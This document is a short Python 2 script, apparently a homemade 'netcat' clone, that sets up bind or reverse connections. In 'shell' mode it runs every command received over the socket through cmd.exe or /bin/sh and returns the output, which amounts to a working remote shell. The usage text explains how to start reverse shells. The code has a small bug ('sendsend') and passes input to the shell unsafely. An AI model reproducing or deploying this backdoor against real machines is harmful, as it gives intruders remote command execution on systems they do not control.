# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import socket
global listen_port
global connect_ip
global connect_port
global command
global shell
def run_command(command):
    if os.name == "nt":
        try:
            p = subprocess.check_output("cmd.exe /c %s" % command,stderr=subprocess.STDOUT,shell=True)
            return p
        except subprocess.CalledProcessError as e:
            return e.output
    else:
        try:
            p = subprocess.check_output("/bin/sh -c '%s'" % command,stderr=subprocess.STDOUT,shell=True)
            return p
        except subprocess.CalledProcessError as e:
            return e.output
def server(listen_port,shell):
    if shell == True:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.bind(("",listen_port))
        sock.listen(5)
        client_sock,addr = sock.accept()
        while True:
            cmd = client_sock._sock.recv(5000000)
            if cmd == "exit":
                sys.exit(0)
            else:
                data = run_command(cmd)
                client_sock._sock.sendsend(data)
    else:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.bind(("",listen_port))
        sock.listen(5)
        client_sock,addr = sock.accept()
        while True:
            recv_data = raw_input("netcat:>")
            client_sock._sock.send(recv_data)
            recv = client_sock._sock.recv(5000000)
            print(str(recv))
def client(connect_ip,connect_port,shell):
    if shell == True:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((connect_ip,connect_port))
        while True:
            cmd = sock.recv(5000000)
            if cmd == "exit":
                sys.exit(0)
            else:
                data = run_command(cmd)
                sock.send(data)
    else:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((connect_ip,connect_port))
        while True:
            recv_data = raw_input("netcat:>")
            sock.send(recv_data)
            recv = sock.recv(5000000)
            print(str(recv))
def usage():
    print("Welcome to netcat tool")
    print("Example:")
    print("Bind Connect -----------------")
    print("Server:")
    print("netcat 4444 shell")
    print("Client:")
    print("netcat 127.0.0.1 4444")
    print("Reverse Connect --------------")
    print("Server:")
    print("netcat 4444")
    print("Client:")
    print("netcat 127.0.0.1 4444 shell")
def main():
    if len(sys.argv) == 2:
        listen_port = int(sys.argv[1])
        shell = False
        server(listen_port,shell)
    elif len(sys.argv) == 3:
        if sys.argv[2] == "shell":
            listen_port = int(sys.argv[1])
            shell = True
            server(listen_port,shell)
        else:
            connect_ip = str(sys.argv[1])
            connect_port = int(sys.argv[2])
            shell = False
            client(connect_ip,connect_port,shell)
    elif len(sys.argv) == 4:
        shell = True
        connect_ip = str(sys.argv[1])
        connect_port = int(sys.argv[2])
        client(connect_ip,connect_port,shell)
    else:
        usage()
main()
